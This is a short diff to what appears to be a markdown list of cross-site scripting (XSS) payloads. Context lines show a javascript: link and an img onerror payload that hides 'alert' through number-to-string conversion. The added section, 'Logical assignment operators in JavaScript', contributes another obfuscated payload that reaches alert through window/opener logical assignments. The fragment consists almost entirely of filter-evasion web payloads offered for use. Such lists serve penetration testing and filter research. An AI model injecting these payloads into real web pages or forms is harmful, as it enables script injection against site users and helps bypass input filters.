@@ -61,3 +61,8 @@ TestPayload&lt;/a&gt;&lt;a href="javascript:alert(1)"&gt;ClickHere&lt;/a&gt;
 ```js
 <img src="X" onerror=top[8680439..toString(30)](1337)>
 ```
+
+## Logical assignment operators in JavaScript
+```js
+window&&=(window&&=opener||=alert)?.(1??0,)
+```
